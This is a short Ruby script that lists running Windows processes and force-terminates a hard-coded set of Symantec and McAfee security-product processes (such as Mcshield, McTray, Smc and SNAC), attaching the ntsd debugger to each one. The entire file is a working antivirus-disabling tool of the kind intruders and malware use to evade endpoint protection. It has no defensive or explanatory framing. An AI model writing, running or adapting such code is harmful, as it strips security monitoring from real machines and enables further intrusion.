out = %x[tasklist]
processes =  out.scan(/\w+.exe\s+\d+/)
array = []
processes.each do |process|
  if /(?<name>\w+).exe\s+(?<pid>\d+)/ =~ process
    array << {:name => name, :pid =>pid}
  end
end


to_kill = []
to_kill << "SmcGui"
to_kill << "UdaterUI"
to_kill << "naPrdMgr"
to_kill << "VsTskMgr"
to_kill << "FrameworkService"
to_kill << "Smc"
to_kill << "McTray"
to_kill << "Mcshield"
to_kill << "SNAC"


#require "pp"
#pp array

to_kill.each do |kill|
  array.each do |proc|
    if proc[:name] == kill
      %x[ntsd -c q -p #{proc[:pid]}]
    end
  end
end
